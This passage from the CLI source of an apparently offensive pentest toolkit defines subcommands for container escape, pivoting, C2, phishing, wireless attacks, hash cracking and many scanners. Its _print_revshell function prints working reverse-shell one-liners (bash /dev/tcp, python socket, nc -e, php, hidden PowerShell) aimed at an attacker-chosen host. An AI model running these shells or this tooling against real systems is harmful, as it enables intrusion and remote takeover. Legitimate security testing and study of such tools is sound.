    # ---------- Container Escape ----------
    sub.add_parser("escape")
    sub.add_parser("escape-scan")
    sub.add_parser("escape-cves")
    s = sub.add_parser("escape-cve"); s.add_argument("cve_id")
    sub.add_parser("escape-caps")

    # ---------- DB Attack ----------
    sub.add_parser("db")
    s = sub.add_parser("db-scan"); s.add_argument("host")
    s = sub.add_parser("db-mongo"); s.add_argument("host")
    s = sub.add_parser("db-redis"); s.add_argument("host")
    s = sub.add_parser("db-es"); s.add_argument("host")
    s = sub.add_parser("db-sqlmap"); s.add_argument("url")
    s.add_argument("--preset", default="quick")
    s = sub.add_parser("db-payloads")
    s.add_argument("kind", nargs="?", default="mongodb_auth_bypass")
    sub.add_parser("db-ports")

    # ---------- Pivot ----------
    sub.add_parser("pivot")
    s = sub.add_parser("pivot-reverse")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-p", "--lport", default=None)
    s = sub.add_parser("pivot-bind")
    s.add_argument("-p", "--lport", default=None)
    s = sub.add_parser("pivot-tty")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-p", "--lport", default=None)
    s = sub.add_parser("pivot-transfer")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-t", "--target-ip", default=None)
    s = sub.add_parser("pivot-tunnel")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-p", "--lport", default=None)
    s.add_argument("-t", "--target-ip", default=None)
    s = sub.add_parser("pivot-linux")
    s.add_argument("-t", "--target-ip", default=None)
    s = sub.add_parser("pivot-windows")
    s.add_argument("-l", "--lhost", default=None)
    sub.add_parser("pivot-encode")
    sub.add_parser("pivot-tools")
    sub.add_parser("pivot-shortcuts")
    sub.add_parser("pivot-container")
    sub.add_parser("pivot-cloud")
    sub.add_parser("pivot-cred-dump")
    sub.add_parser("pivot-persistence")

    # ---------- Red Team C2 ----------
    sub.add_parser("c2")
    sub.add_parser("c2-sheets")
    sub.add_parser("c2-sliver")
    sub.add_parser("c2-havoc")
    sub.add_parser("c2-mythic")
    s = sub.add_parser("c2-msfvenom")
    s.add_argument("lhost"); s.add_argument("lport")
    sub.add_parser("c2-donut")
    sub.add_parser("c2-opsec")
    sub.add_parser("c2-generators")
    sub.add_parser("c2-listeners")
    sub.add_parser("c2-infra")
    sub.add_parser("c2-evasion")
    sub.add_parser("c2-mitre")

    # ---------- Shell Listener Pro ----------
    sub.add_parser("shell-pro")
    s = sub.add_parser("shell-pro-linux")
    s.add_argument("-p", "--port", type=int, default=4444)
    s = sub.add_parser("shell-pro-win")
    s.add_argument("-p", "--port", type=int, default=4444)
    s = sub.add_parser("shell-pro-quiet")
    s.add_argument("-p", "--port", type=int, default=4444)
    sub.add_parser("shell-pro-help")
    sub.add_parser("shell-pro-shortcuts")

    # ---------- Adversary Emulation ----------
    sub.add_parser("adv")
    sub.add_parser("adv-list")
    s = sub.add_parser("adv-tactic"); s.add_argument("tactic")
    s = sub.add_parser("adv-platform")
    s.add_argument("platform", choices=["windows", "linux", "macos"])
    s = sub.add_parser("adv-detail"); s.add_argument("ttp_id")
    sub.add_parser("adv-tactics")
    sub.add_parser("adv-export-json")
    sub.add_parser("adv-export-md")
    sub.add_parser("adv-export-navigator")

    # ---------- Threat Intel ----------
    sub.add_parser("ti")
    s = sub.add_parser("ti-ip"); s.add_argument("ip")
    s = sub.add_parser("ti-domain"); s.add_argument("domain")
    s = sub.add_parser("ti-hash"); s.add_argument("hash")
    s = sub.add_parser("ti-url"); s.add_argument("url")
    s = sub.add_parser("ti-auto"); s.add_argument("ioc")
    s = sub.add_parser("ti-bulk")
    s.add_argument("source")
    s.add_argument("-t", "--threads", type=int, default=4)
    sub.add_parser("ti-sources")
    sub.add_parser("ti-cache")

    # ---------- Auto-Scan / Autopilot ----------
    sub.add_parser("autoscan")
    s = sub.add_parser("autoscan-run")
    s.add_argument("domain")
    s.add_argument("--profile",
                   choices=["quick", "full", "deep"], default="full")
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--skip", default=None)
    sub.add_parser("autoscan-profiles")
    sub.add_parser("autoscan-past")

    sub.add_parser("ap")
    s = sub.add_parser("ap-run")
    s.add_argument("domain")
    s.add_argument("--profile",
                   choices=["quick", "full", "deep"], default="full")
    sub.add_parser("ap-profiles")
    sub.add_parser("ap-past")

    # ---------- Report Pack ----------
    sub.add_parser("report-pack")
    s = sub.add_parser("rp-new")
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    s = sub.add_parser("rp-preset")
    s.add_argument("preset")
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    s = sub.add_parser("rp-from-finding")
    s.add_argument("finding_id", type=int)
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    s.add_argument("--preset", default=None)
    s = sub.add_parser("rp-bulk")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    sub.add_parser("rp-platforms")
    sub.add_parser("rp-presets")
    s = sub.add_parser("rp-cvss"); s.add_argument("vector")
    sub.add_parser("rp-list")
    s = sub.add_parser("rp-timeline")
    s.add_argument("-d", "--days", type=int, default=90)

    # ---------- Hash Suite ----------
    sub.add_parser("hs")
    sub.add_parser("hs-tools")
    s = sub.add_parser("hs-identify"); s.add_argument("hash")
    s = sub.add_parser("hs-crack")
    s.add_argument("hash")
    s.add_argument("-w", "--wordlist", default=None)
    s.add_argument("-r", "--rules", default=None)
    s = sub.add_parser("hs-mask")
    s.add_argument("hash"); s.add_argument("mask")
    s = sub.add_parser("hs-file")
    s.add_argument("hash_file")
    s.add_argument("-w", "--wordlist", default=None)
    s.add_argument("-r", "--rules", default=None)

    # ---------- Social Engineering ----------
    sub.add_parser("se")
    sub.add_parser("se-templates")
    s = sub.add_parser("se-phish")
    s.add_argument("template", nargs="?", default="employee-portal")
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-server")
    s.add_argument("-p", "--port", type=int, default=8000)
    s.add_argument("-t", "--template", default="employee-portal")
    s.add_argument("-r", "--redirect", default="https://example.com")
    s = sub.add_parser("se-qr")
    s.add_argument("data"); s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-qr-menu")
    s = sub.add_parser("se-email")
    s.add_argument("template", nargs="?", default="it-helpdesk")
    s.add_argument("-l", "--link", default="https://example.com/login")
    s.add_argument("--name", default="John")
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-sms")
    s.add_argument("template", nargs="?", default="bank")
    s.add_argument("-l", "--link", default="https://example.com")
    s = sub.add_parser("se-voice")
    s.add_argument("name", nargs="?", default="it-helpdesk")
    s = sub.add_parser("se-clone")
    s.add_argument("url"); s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-obfuscate"); s.add_argument("url")
    s = sub.add_parser("se-pixel")
    s.add_argument("-s", "--server",
                   default="http://127.0.0.1:8000/pixel")
    s.add_argument("-o", "--out", default=None)

    # ---------- SSRF Pro ----------
    sub.add_parser("ssrf")
    sub.add_parser("ssrf-cloud")
    sub.add_parser("ssrf-ip")
    sub.add_parser("ssrf-schemes")
    sub.add_parser("ssrf-parser")
    s = sub.add_parser("ssrf-rebind")
    s.add_argument("domain", nargs="?", default="rebind.attacker.com")
    sub.add_parser("ssrf-blind")
    sub.add_parser("ssrf-chains")
    sub.add_parser("ssrf-export-all")

    # ---------- Web3 ----------
    sub.add_parser("web3")
    s = sub.add_parser("web3-solidity"); s.add_argument("path")
    s = sub.add_parser("web3-dir"); s.add_argument("path")
    s = sub.add_parser("web3-pk"); s.add_argument("path")
    s = sub.add_parser("web3-etherscan"); s.add_argument("address")
    s = sub.add_parser("web3-honeypot"); s.add_argument("address")
    s = sub.add_parser("web3-drainer"); s.add_argument("path")

    # ---------- Mobile ----------
    sub.add_parser("mobile")
    s = sub.add_parser("mobile-analyze"); s.add_argument("path")
    s = sub.add_parser("mobile-apk"); s.add_argument("path")
    s = sub.add_parser("mobile-ipa"); s.add_argument("path")

    # ---------- RE ----------
    sub.add_parser("re")
    s = sub.add_parser("re-analyze"); s.add_argument("path")
    s = sub.add_parser("re-strings"); s.add_argument("path")
    s.add_argument("-n", "--min-len", type=int, default=4)
    s = sub.add_parser("re-entropy"); s.add_argument("path")
    s = sub.add_parser("re-yara")
    s.add_argument("path"); s.add_argument("--rules", default=None)
    s = sub.add_parser("re-pe"); s.add_argument("path")
    s = sub.add_parser("re-elf"); s.add_argument("path")
    s = sub.add_parser("re-macho"); s.add_argument("path")
    s = sub.add_parser("re-shellcode"); s.add_argument("path")
    s = sub.add_parser("re-miner"); s.add_argument("path")

    # ---------- Forensics ----------
    sub.add_parser("forensics")
    s = sub.add_parser("forensics-ioc"); s.add_argument("path")
    s = sub.add_parser("forensics-timeline"); s.add_argument("path")
    s = sub.add_parser("forensics-sysmon"); s.add_argument("path")
    s = sub.add_parser("forensics-authlog")
    s.add_argument("path", nargs="?", default="/var/log/auth.log")
    s = sub.add_parser("forensics-auditd")
    s.add_argument("path", nargs="?",
                   default="/var/log/audit/audit.log")
    s = sub.add_parser("forensics-yara")
    s.add_argument("path"); s.add_argument("--rules", default=None)
    s = sub.add_parser("forensics-browser")
    s.add_argument("browser", nargs="?", default="chrome")

    # ---------- Threat Hunting ----------
    sub.add_parser("hunting")
    sub.add_parser("hunting-sigma")
    sub.add_parser("hunting-playbooks")
    s = sub.add_parser("hunting-playbook"); s.add_argument("tactic")
    sub.add_parser("hunting-mitre")
    sub.add_parser("hunting-export-sigma")
    sub.add_parser("hunting-export-navigator")
    sub.add_parser("hunting-export-dashboard")

    # ---------- PCAP ----------
    sub.add_parser("pcap")
    s = sub.add_parser("pcap-analyze"); s.add_argument("path")
    s = sub.add_parser("pcap-html"); s.add_argument("path")
    s = sub.add_parser("pcap-csv"); s.add_argument("path")
    s = sub.add_parser("pcap-md"); s.add_argument("path")
    s = sub.add_parser("pcap-all"); s.add_argument("path")

    # ---------- Wireless Attack ----------
    sub.add_parser("wl-tools")
    sub.add_parser("wl-ifaces")
    s = sub.add_parser("wl-wpa"); s.add_argument("--iface", default="wlan0")
    s = sub.add_parser("wl-pmkid"); s.add_argument("--iface", default="wlan0")
    s = sub.add_parser("wl-wps")
    s.add_argument("--iface", default="wlan0")
    s.add_argument("--bssid", default="AA:BB:CC:DD:EE:FF")
    s = sub.add_parser("wl-evil")
    s.add_argument("--ssid", default="Free WiFi")
    s.add_argument("--iface", default="wlan0")
    s = sub.add_parser("wl-deauth")
    s.add_argument("--iface", default="wlan0mon")

    # Wireless Attack Pro
    sub.add_parser("wl-pro")
    sub.add_parser("wl-pro-tools")
    sub.add_parser("wl-pro-cheatsheets")
    s = sub.add_parser("wl-pro-cheat"); s.add_argument("name")
    sub.add_parser("wl-pro-export-all")

    # ---------- Compliance / SDK ----------
    sub.add_parser("audit")
    sub.add_parser("audit-cis")
    sub.add_parser("audit-owasp")
    sub.add_parser("audit-asvs")
    sub.add_parser("audit-pci")
    sub.add_parser("audit-iso")
    sub.add_parser("audit-nist")
    sub.add_parser("audit-all")
    sub.add_parser("audit-live")

    sub.add_parser("sdk")
    sub.add_parser("sdk-list")
    sub.add_parser("sdk-validate")
    sub.add_parser("sdk-docs")
    sub.add_parser("sdk-templates")
    s = sub.add_parser("sdk-generate")
    s.add_argument("name")
    s.add_argument("--template",
                   choices=["basic", "network", "web", "crypto",
                            "forensics", "recon", "custom"],
                   default="basic")

    # ---------- Scheduler / Notifier / Bot ----------
    sub.add_parser("scheduler")
    sub.add_parser("scheduler-list")
    sub.add_parser("scheduler-run")
    sub.add_parser("scheduler-run-dry")
    sub.add_parser("scheduler-pause")
    sub.add_parser("scheduler-resume")
    sub.add_parser("scheduler-history")
    sub.add_parser("notify")
    sub.add_parser("notify-status")
    sub.add_parser("notify-test")
    sub.add_parser("notify-history")
    sub.add_parser("bot")
    sub.add_parser("bot-info")
    sub.add_parser("bot-start")
    sub.add_parser("bot-stop")

    # ---------- Stego / Utils ----------
    sub.add_parser("stego")
    s = sub.add_parser("stego-chi-png"); s.add_argument("path")
    s = sub.add_parser("stego-chi-wav"); s.add_argument("path")
    s = sub.add_parser("stego-rs"); s.add_argument("path")
    s = sub.add_parser("stego-spa"); s.add_argument("path")
    s = sub.add_parser("stego-capacity"); s.add_argument("path")

    sub.add_parser("utils")
    s = sub.add_parser("b64encode"); s.add_argument("text")
    s = sub.add_parser("b64decode"); s.add_argument("text")
    s = sub.add_parser("filehash"); s.add_argument("path")
    s = sub.add_parser("revshell")
    s.add_argument("lhost"); s.add_argument("-p", "--lport", default="4444")

    # ---------- Roadmap ----------
    sub.add_parser("roadmap")
    s = sub.add_parser("roadmap-show")
    s.add_argument("--level", default=None)
    sub.add_parser("roadmap-resources")
    sub.add_parser("roadmap-certs")
    s = sub.add_parser("roadmap-quiz")
    s.add_argument("--mode", choices=["short", "medium", "full"],
                   default="short")
    s.add_argument("--category", default=None)
    sub.add_parser("roadmap-progress")
    s = sub.add_parser("roadmap-export")
    s.add_argument("--fmt", choices=["json", "md", "html", "csv"],
                   default="json")
    sub.add_parser("roadmap-streak")

    # ---------- TUI ----------
    sub.add_parser("tui")
    return p


def _print_revshell(lhost: str, lport: str) -> None:
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "php": (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})"
        ),
    }
    for name, cmd in shells.items():
        console.print(f"[cyan]{name}:[/cyan] [green]{cmd}[/green]")


def _dispatch_cli(args: argparse.Namespace) -> bool:
    cmd = args.cmd
    try:
        # ================ Recon ================
        if cmd == "whois": recon.whois_lookup(args.target)
        elif cmd == "dns": recon.dns_enum(args.target)
        elif cmd == "subdomain": recon.subdomain_scan(args.target)
        elif cmd == "portscan": recon.port_scan(args.target, args.ports)
        elif cmd == "geoip": recon.ip_geolocation(args.target)
        elif cmd == "fingerprint": recon.tech_fingerprint(args.url)
        elif cmd == "dork": recon.google_dork(args.domain)
        elif cmd == "shodan": recon.shodan_lookup(args.query)

        # ================ Web ================
        elif cmd == "headers": web_vuln.header_analyzer(args.url)
        elif cmd == "ssl": web_vuln.ssl_checker(args.host)
        elif cmd == "sqli": web_vuln.sqli_scan(args.url)
        elif cmd == "xss": web_vuln.xss_scan(args.url)
        elif cmd == "lfi": web_vuln.lfi_scan(args.url)
        elif cmd == "dirb": web_vuln.dir_bruteforce(args.url)
        elif cmd == "cms": web_vuln.cms_scanner(args.url)
        elif cmd == "redirect": web_vuln.open_redirect(args.url)
        elif cmd == "csrf": web_vuln.csrf_checker(args.url)

        # ================ Passwords / Hashes ================
        elif cmd == "hashid": passwords.identify_hash(args.hash)
        elif cmd == "crack": passwords.crack_hash(args.hash)
        elif cmd == "genpass": passwords.generate_password(args.length)

        elif cmd == "hs": hash_suite.menu()
        elif cmd == "hs-tools": hash_suite.cli_tools()
        elif cmd == "hs-identify": hash_suite.cli_identify(args.hash)
        elif cmd == "hs-crack":
            hash_suite.cli_crack(args.hash, args.wordlist, args.rules)
        elif cmd == "hs-mask": hash_suite.cli_mask(args.hash, args.mask)
        elif cmd == "hs-file":
            hash_suite.cli_file(args.hash_file, args.wordlist, args.rules)

        # ================ OSINT ================
        elif cmd == "username": osint.username_check(args.username)
        elif cmd == "hibp": osint.email_breach(args.email)
        elif cmd == "phone": osint.phone_lookup(args.phone)
        elif cmd == "exif": osint.exif_extractor(args.path)
        elif cmd == "ghdork": osint.github_dork(args.query)

        # ================ OSINT Pro ================
        elif cmd == "osint-pro": osint_pro.menu()
        elif cmd == "op-username": osint_pro.cli_username(args.username)
        elif cmd == "op-telegram": osint_pro.cli_telegram(args.username)
        elif cmd == "op-gravatar": osint_pro.cli_gravatar(args.email)
        elif cmd == "op-wayback": osint_pro.cli_wayback(args.domain)
        elif cmd == "op-age": osint_pro.cli_age(args.domain)
        elif cmd == "op-dns": osint_pro.cli_dns(args.domain)
        elif cmd == "op-github": osint_pro.cli_github(args.username)
        elif cmd == "op-email": osint_pro.cli_email(args.email)
        elif cmd == "op-image": osint_pro.cli_image(args.url)

        # ================ Censys ================
        elif cmd == "censys": censys_lookup.censys_search(args.query)
        elif cmd == "censys-host": censys_lookup.censys_host(args.ip)
        elif cmd == "censys-cert": censys_lookup.censys_cert(args.sha256)

        # ================ Async ================
        elif cmd == "asyncscan":
            async_engine.async_port_scan(args.target, args.ports,
                                          args.concurrency)
        elif cmd == "asyncweb":
            async_engine.async_http_scan(args.url, args.paths,
                                          args.concurrency)

        # ================ Wordlists ================
        elif cmd == "wordlists-update":
            if args.check: wordlist_updater.check_updates()
            else: wordlist_updater.update_all()
        elif cmd == "wordlist-gen":
            wordlist_tools.generate_wordlist(
                base_word=args.word, out_name=args.out,
                leet=not args.no_leet, years=not args.no_years,
                symbols=not args.no_symbols,
            )

        # ================ Payloads ================
        elif cmd == "payload":
            payload_factory.generate_payloads(
                kind=args.kind, encode=args.encode,
                obfuscate=args.obfuscate, count=args.count,
            )

        # ================ Crawler / Fuzzer ================
        elif cmd == "crawl":
            web_crawler.crawl(args.url, depth=args.depth,
                               max_pages=args.max_pages)
        elif cmd == "fuzz":
            if args.mode == "paths":
                web_fuzzer.fuzz_paths(args.url, args.wordlist, args.threads)
            elif args.mode == "params":
                web_fuzzer.fuzz_params(args.url, None, args.wordlist,
                                        args.threads)
            elif args.mode == "headers":
                web_fuzzer.fuzz_headers(args.url, args.header,
                                         args.wordlist, args.threads)

        # ================ Screenshot ================
        elif cmd == "screenshot":
            screenshot.screenshot_one(args.url,
                                       full_page=not args.no_full)

        # ================ Reports ================
        elif cmd == "export-html": report_export.export_html(args.limit)
        elif cmd == "export-pdf": report_export.export_pdf(args.limit)
        elif cmd == "export-scan":
            report_export.export_scan_markdown(args.scan_id)
        elif cmd == "stats": stats.text_summary()
        elif cmd == "stats-graphs":
            stats.generate_all(open_after=args.open)

        # ================ Plugins ================
        elif cmd == "plugins": plugin_loader.list_plugins_cli()
        elif cmd == "plugins-menu": plugin_loader.plugin_menu()
        elif cmd == "plugins-reload":
            reg = plugin_loader.reload_plugins()
            console.print(f"[green]✓ Загружено плагинов: "
                          f"{len(reg)}[/green]")
        elif cmd == "plugin-run":
            plugin_loader.run_plugin_cli(args.key, args.arg)

        # ================ Vault ================
        elif cmd == "vault": vault.menu()
        elif cmd == "vault-status": vault.cli_status()
        elif cmd == "vault-init": vault.cli_init()
        elif cmd == "vault-add":
            vault.cli_add(
                title=args.title, username=args.username,
                password=args.password, url=args.url, notes=args.notes,
                generate=args.generate, gen_len=args.length,
            )
        elif cmd == "vault-get": vault.cli_get(args.title)
        elif cmd == "vault-list": vault.cli_list()
        elif cmd == "vault-search": vault.cli_search(args.query)
        elif cmd == "vault-del": vault.cli_delete(args.title)
        elif cmd == "vault-export": vault.cli_export(args.out)
        elif cmd == "vault-import": vault.cli_import(args.in_path)
        elif cmd == "vault-change-master": vault.cli_change_master()

        # ================ Notes ================
        elif cmd == "notes": notes.menu()
        elif cmd == "note-stats": notes.cli_stats()
        elif cmd == "note-add":
            tags = [t.strip() for t in (args.tags or "").split(",")
                    if t.strip()]
            notes.cli_add(kind="note", title=args.title, body=args.body,
                          target=args.target, tags=tags or None)
        elif cmd == "finding-add":
            tags = [t.strip() for t in (args.tags or "").split(",")
                    if t.strip()]
            notes.cli_add(kind="finding", title=args.title,
                          body=args.body, target=args.target,
                          severity=args.severity, status=args.status,
                          tags=tags or None)
        elif cmd == "note-list":
            notes.cli_list(kind=args.kind, target=args.target,
                           status=args.status, severity=args.severity,
                           tag=args.tag)
        elif cmd == "note-show": notes.cli_show(args.id)
        elif cmd == "note-del": notes.cli_del(args.id)
        elif cmd == "note-edit": notes.cli_edit(args.id)
        elif cmd == "note-search": notes.cli_search(args.query)
        elif cmd == "findings-export":
            notes.cli_export(target=args.target, out_path=args.out,
                              fmt=args.fmt)

        # ================ Auto-Report ================
        elif cmd == "report-pro": auto_report.menu()
        elif cmd == "report-pro-html":
            p = auto_report.generate_html(
                target_filter=args.target, template=args.template,
                out_path=args.out,
            )
            if p and args.open: auto_report._open_file(p)
        elif cmd == "report-pro-pdf":
            p = auto_report.generate_pdf(
                target_filter=args.target, template=args.template,
                out_path=args.out,
            )
            if p and args.open: auto_report._open_file(p)
        elif cmd == "report-pro-json":
            auto_report.generate_json(target_filter=args.target,
                                       out_path=args.out)
        elif cmd == "report-pro-md":
            auto_report.generate_markdown(target_filter=args.target,
                                            out_path=args.out)
        elif cmd == "report-pro-diff":
            auto_report.incremental_diff()

        # ================ Proxy ================
        elif cmd == "proxy": http_proxy.menu()
        elif cmd == "proxy-start":
            http_proxy.run_proxy(port=args.port,
                                  intercept_https=not args.no_mitm)
        elif cmd == "proxy-status": http_proxy.quick_status()
        elif cmd == "proxy-ca": http_proxy.cli_ca_info()
        elif cmd == "proxy-rules": http_proxy.cli_list_rules()
        elif cmd == "proxy-rules-clear": http_proxy.cli_clear_rules()
        elif cmd == "proxy-rule-add":
            http_proxy.cli_add_rule(
                target=args.target, match=args.match, action=args.action,
                replace=args.replace, header_name=args.header_name,
                header_value=args.header_value,
            )

        # ================ Shell Manager ================
        elif cmd == "shell": shell_manager.repl()
        elif cmd == "shell-status": shell_manager.cli_status()
        elif cmd == "shell-list": shell_manager.cli_list()
        elif cmd == "shell-start":
            shell_manager.cli_start(host=args.host, port=args.port)
        elif cmd == "shell-stop": shell_manager.cli_stop()

        # ================ Shell Listener Pro ================
        elif cmd == "shell-pro":
            shell_listener_pro.cli_repl(port=4444)
        elif cmd == "shell-pro-linux":
            shell_listener_pro.cli_repl(port=args.port)
        elif cmd == "shell-pro-win":
            shell_listener_pro.cli_repl_win(port=args.port)
        elif cmd == "shell-pro-quiet":
            shell_listener_pro.cli_repl_no_auto(port=args.port)
        elif cmd == "shell-pro-help":
            shell_listener_pro.show_listener_help()
        elif cmd == "shell-pro-shortcuts":
            shell_listener_pro.show_shortcuts()

        # ================ DNS Tools ================
        elif cmd == "dns-tools": dns_tools.menu()
        elif cmd == "dns-axfr": dns_tools.zone_transfer(args.domain)
        elif cmd == "dns-dnssec": dns_tools.dnssec_check(args.domain)
        elif cmd == "dns-wildcard": dns_tools.wildcard_detect(args.domain)
        elif cmd == "dns-ptr":
            dns_tools.reverse_scan(args.cidr, threads=args.threads)
        elif cmd == "dns-snoop":
            dns_tools.cache_snooping(args.domain, args.resolver)
        elif cmd == "dns-cname": dns_tools.show_cname_chain(args.domain)
        elif cmd == "dns-srv": dns_tools.srv_scan(args.domain)
        elif cmd == "dns-mail": dns_tools.mail_security(args.domain)
        elif cmd == "dns-rebinding":
            dns_tools.rebinding_detect(args.domain)

        # ================ Takeover ================
        elif cmd == "takeover": subdomain_takeover.menu()
        elif cmd == "takeover-scan":
            subdomain_takeover.cli_scan(args.domain,
                                          wordlist=args.wordlist,
                                          threads=args.threads)
        elif cmd == "takeover-check":
            subdomain_takeover.cli_check(args.subdomain)
        elif cmd == "takeover-batch":
            subdomain_takeover.cli_batch(args.source, threads=args.threads)
        elif cmd == "takeover-services":
            subdomain_takeover.cli_services()

        # ================ Takeover v2 ================
        elif cmd == "takeover-v2": subdomain_takeover_v2.menu()
        elif cmd == "takeover-v2-scan":
            subdomain_takeover_v2.cli_scan(args.domain, args.wordlist,
                                            args.threads)
        elif cmd == "takeover-v2-check":
            subdomain_takeover_v2.cli_check(args.subdomain)
        elif cmd == "takeover-v2-batch":
            subdomain_takeover_v2.cli_batch(args.source, args.threads)
        elif cmd == "takeover-v2-services":
            subdomain_takeover_v2.cli_services()
        elif cmd == "takeover-v2-history":
            subdomain_takeover_v2.cli_history()

        # ================ Subdomain Monitor ================
        elif cmd == "monitor": subdomain_monitor.menu()
        elif cmd == "monitor-add":
            subdomain_monitor.cli_add(args.domain, args.interval)
        elif cmd == "monitor-rm": subdomain_monitor.cli_remove(args.domain)
        elif cmd == "monitor-list": subdomain_monitor.cli_list()
        elif cmd == "monitor-scan":
            subdomain_monitor.cli_scan(args.domain,
                                        takeover_check=args.takeover)
        elif cmd == "monitor-scan-all": subdomain_monitor.cli_scan_all()
        elif cmd == "monitor-history":
            subdomain_monitor.cli_history(args.domain)

        # ================ CVE ================
        elif cmd == "cve": cve_feeds.menu()
        elif cmd == "cve-download":
            cve_feeds.cli_download(keyword=args.keyword, days=args.days,
                                    max_results=args.max_results)
        elif cmd == "cve-search":
            cve_feeds.cli_search(args.keyword, min_score=args.min_score,
                                  only_kev=args.kev, limit=args.limit)
        elif cmd == "cve-top":
            cve_feeds.cli_top(days=args.days, min_score=args.min_score,
                               limit=args.limit)
        elif cmd == "cve-kev": cve_feeds.cli_kev(limit=args.limit)
        elif cmd == "cve-kev-update": cve_feeds.download_kev()
        elif cmd == "cve-show": cve_feeds.cli_show(args.cve_id)
        elif cmd == "cve-dorks":
            cve_feeds.cli_dorks(args.product, version=args.version,
                                 cve_id=args.cve_id)
        elif cmd == "cve-stats": cve_feeds.stats()

        # ================ WiFi ================
        elif cmd == "wifi": wireless_toolkit.menu()
        elif cmd == "wifi-scan": wireless_toolkit.cli_scan()
        elif cmd == "wifi-evil": wireless_toolkit.cli_evil_twin()
        elif cmd == "wifi-open": wireless_toolkit.cli_open()
        elif cmd == "wifi-weak": wireless_toolkit.cli_weak()
        elif cmd == "wifi-channels": wireless_toolkit.cli_channels()
        elif cmd == "wifi-top": wireless_toolkit.cli_top()
        elif cmd == "wifi-export-csv": wireless_toolkit.cli_export_csv()
        elif cmd == "wifi-export-json": wireless_toolkit.cli_export_json()
        elif cmd == "wifi-full": wireless_toolkit.cli_full()

        # ================ WordPress ================
        elif cmd == "wp": wordpress_scanner.menu()
        elif cmd == "wp-scan":
            wordpress_scanner.cli_scan(args.url,
                                        aggressive=args.aggressive)
        elif cmd == "wp-detect": wordpress_scanner.cli_detect(args.url)
        elif cmd == "wp-users": wordpress_scanner.cli_users(args.url)
        elif cmd == "wp-plugins": wordpress_scanner.cli_plugins(args.url)
        elif cmd == "wp-xmlrpc": wordpress_scanner.cli_xmlrpc(args.url)
        elif cmd == "wp-vulns": wordpress_scanner.cli_vulns(args.url)
        elif cmd == "wp-rest": wordpress_scanner.cli_rest(args.url)

        # ================ GraphQL Discovery ================
        elif cmd == "gql": graphql_discovery.menu()
        elif cmd == "gql-scan": graphql_discovery.cli_full(args.url)
        elif cmd == "gql-discover": graphql_discovery.cli_gql(args.url)
        elif cmd == "gql-introspect":
            graphql_discovery.cli_gql_introspect(args.endpoint)
        elif cmd == "api-swagger": graphql_discovery.cli_swagger(args.url)
        elif cmd == "api-rest": graphql_discovery.cli_rest(args.url)
        elif cmd == "api-js": graphql_discovery.cli_js(args.url)

        # ================ GraphQL Security ================
        elif cmd == "gql-sec": graphql_security.menu()
        elif cmd == "gql-sec-scan":
            graphql_security.cli_scan(args.endpoint)
        elif cmd == "gql-sec-introspect":
            graphql_security.cli_introspect(args.endpoint)
        elif cmd == "gql-sec-suggest":
            graphql_security.cli_suggestions(args.endpoint)
        elif cmd == "gql-sec-batch":
            graphql_security.cli_batch(args.endpoint, args.count)
        elif cmd == "gql-sec-alias":
            graphql_security.cli_alias(args.endpoint, args.count)
        elif cmd == "gql-sec-csrf":
            graphql_security.cli_csrf(args.endpoint)

        # ================ API Fuzzer ================
        elif cmd == "api-fuzz": api_fuzzer.menu()
        elif cmd == "api-fuzz-scan":
            api_fuzzer.cli_scan(args.spec, args.base_url, args.auth)
        elif cmd == "api-fuzz-ratelimit":
            api_fuzzer.cli_ratelimit(args.url, args.count)
        elif cmd == "api-fuzz-graphql": api_fuzzer.cli_graphql(args.url)
        elif cmd == "api-fuzz-bola":
            api_fuzzer.cli_bola(args.base, args.endpoint, args.param)

        # ================ JS Secrets ================
        elif cmd == "secrets": js_secrets.menu()
        elif cmd == "secrets-scan":
            js_secrets.cli_scan(args.url, validate=args.validate)
        elif cmd == "secrets-js":
            js_secrets.cli_js(args.url, validate=args.validate)

        # ================ Cache Poisoning ================
        elif cmd == "cache-poison": cache_poisoning.menu()
        elif cmd == "cache-scan": cache_poisoning.cli_scan(args.url)
        elif cmd == "cache-unkeyed": cache_poisoning.cli_unkeyed(args.url)
        elif cmd == "cache-deception":
            cache_poisoning.cli_deception(args.url)
        elif cmd == "cache-vary": cache_poisoning.cli_vary(args.url)
        elif cmd == "cache-fat": cache_poisoning.cli_fat(args.url)
        elif cmd == "cache-param":
            cache_poisoning.cli_param_cloaking(args.url)
        elif cmd == "cache-host":
            cache_poisoning.cli_host_injection(args.url)

        # ================ Cloud IAM ================
        elif cmd == "cloud-iam": cloud_iam.menu()
        elif cmd == "cloud-iam-aws": cloud_iam.cli_aws(args.profile)
        elif cmd == "cloud-iam-gcp": cloud_iam.cli_gcp(args.creds)
        elif cmd == "cloud-iam-azure": cloud_iam.cli_azure()
        elif cmd == "cloud-iam-env": cloud_iam.cli_env()
        elif cmd == "cloud-iam-files": cloud_iam.cli_files()
        elif cmd == "cloud-iam-full": cloud_iam.full_audit()

